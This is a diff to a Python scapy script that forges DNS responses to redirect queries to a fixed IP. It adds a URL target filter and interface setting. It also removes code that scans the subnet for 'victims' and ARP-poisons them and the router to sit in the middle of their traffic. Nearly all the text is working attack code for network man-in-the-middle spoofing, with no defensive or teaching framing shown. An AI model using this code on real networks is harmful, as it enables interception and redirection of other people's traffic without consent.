@@ -7,8 +7,9 @@ import proxy
 
 destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)
 
+IFACE = "enp0s10"
 
-dns_looping = True #set this to false to stop the thread
+urls = [] #list of urls to spoof, empty is all
 
 #if packet is dns and has qr=0, it is a query
 def isDnsQuery(packet):
@@ -16,6 +17,14 @@ def isDnsQuery(packet):
 
 def isDnsResponse(packet):
     return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 1
+
+def isTarget(packet): #checks whether dns url is in the list of urls to spoof
+    if len(urls) == 0 :
+        return True
+    qname = packet[scapy.DNSQR].qname
+    if qname in urls:
+        return True
+    return False
 
 #todo client doesnt seem to take this as answer even when cut off from internet
 def dns_spoof(packet):
@@ -40,49 +49,4 @@ def dns_spoof(packet):
     spoofed_response = spoofed_response / scapy.DNS(id=dns_id, qr=1, aa=1, rd=packet[scapy.DNS].rd, ra=1, qd=dns_qd, an=dns_rr, ancount=1)
 
 
-    scapy.send(spoofed_response, verbose=False)
-    
-
-def dns_main():
-    arp_prep_automated()
-    proxy.setup_proxy() #start a proxy and dns spoofing will be handled inside
-
-
-
-#Not supposed to be here, we should move later
-
-victim_addresses = {}
-router_ip = None
-sent_packets_count = 0
-current_ip = None
-iface = None
-
-def arp_prep_automated(silent = False, iface_ = "enp0s10") :
-    global victim_addresses, router_ip, iface, sent_packets_count, current_ip
-
-    iface = iface_
-    arp_spoofing.IFACE = iface_
-
-    current_ip = scapy.get_if_addr(iface_)
-    arp_spoofing.ATTACKER_MAC = scapy.get_if_hwaddr(iface_)
-    
-    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
-    router_ip = subnet + '.1' #usually router is at subnet .1
-
-    for i in range(1,10) :  # ips in subnet, should be (1, 255)
-        ip = subnet + "." + str(i)
-        try :
-            victim_addresses[ip] = arp_spoofing.get_mac(ip) #exists
-        except :
-            pass #does not exist
-
-    if current_ip in victim_addresses:
-        del victim_addresses[current_ip]
-    
-    
-    print("Victims: ", str(victim_addresses))
-
-def arp_tick():
-    for victim_ip, victim_mac in victim_addresses.items():
-            arp_spoofing.arp_spoof(victim_ip, router_ip) #send to victim that we are router
-            arp_spoofing.arp_spoof(router_ip, victim_ip) #send to router that we are victim
+    scapy.send(spoofed_response, verbose=False, iface=IFACE)
